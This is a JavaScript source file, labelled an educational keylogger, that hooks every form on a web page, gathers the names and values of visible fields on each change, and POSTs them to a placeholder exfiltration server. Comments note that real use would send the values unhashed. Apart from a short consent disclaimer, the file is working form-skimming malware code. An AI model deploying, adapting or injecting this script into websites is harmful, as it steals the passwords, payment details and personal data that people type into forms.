/*
 * This script is designed to capture data entered into web forms and send it to a specified server.
 * It attaches listeners to all form elements on a webpage and captures the input in real-time.
 * 
 * This is only for educational purposes.
 * 
 * This script should ONLY be used with express permission from the users whose data is being captured.
 * Using this script without consent is unethical and illegal in many jurisdictions. 
 * Always ensure compliance with privacy laws and regulations.
 */

// Wait for the entire window to load before executing our keylogger setup
window.addEventListener('load', setupKeylogger);

// This is the URL where we will send the data. Replace '<your-server>' with your actual server URL.
// To test, you could create a simple server using Python to recieve this information and print it to the console.
// Alternatively, you could create a simple CRUD application that can recieve this data and store it in a database.
const exfiltrationUrl = '<your-server>';

// A function to create a hash of a string
// In the real world, you wouldn't hash this
// You'd send in clear and/or send encrypted and decrypt on your server
function hash(s) {
    for (var i = 0, h = 0; i < s.length; i++)
        h = Math.imul(31, h) + s.charCodeAt(i) | 0;
    return h;
}

// Setting up the keylogger on all forms in the document
function setupKeylogger() {
    // Find all forms on the page and add a change event listener to each
    for (const form of document.querySelectorAll('form')) {
        form.addEventListener('change', function () {
            // When a form changes, generate a payload and send it if it's not empty
            const formData = generatePayload(form);
            if (formData) exfiltrateByXhr(formData);
        });
    }
}

// Function to generate the payload from form data
function generatePayload(form) {
    let payload = '';
    // Get all input, select, and textarea elements in the form
    const targetElements = form.querySelectorAll('input, select, textarea');
    for (const el of targetElements) {
        // Skip hidden elements
        if (el.hidden || el.type === 'hidden') continue;
        // Try to find a name for the field
        const name = el.name || el.id || el.label || el.title || el.placeholder || el.className;
        // Get the value of the field
        const value = el.value || el.text;
        // If both name and value exist, add them to the payload
        if (name && value) {
            payload +=

`${encodeURIComponent(name)}=${encodeURIComponent(hash(value))}&`;
        }
    }
    return payload;
}

// Function to send the captured data to the server
function exfiltrateByXhr(payload) {
    // Create a new XMLHttpRequest
    const xhr = new XMLHttpRequest();
    // Configure it as a POST request to the exfiltration URL
    xhr.open('POST', exfiltrationUrl, true);
    // Set the content type header
    xhr.setRequestHeader('content-type', 'application/x-www-form-urlencoded');
    // Send the payload
    xhr.send(payload);
}

// Call setupKeylogger to initialize the keylogger
setupKeylogger();
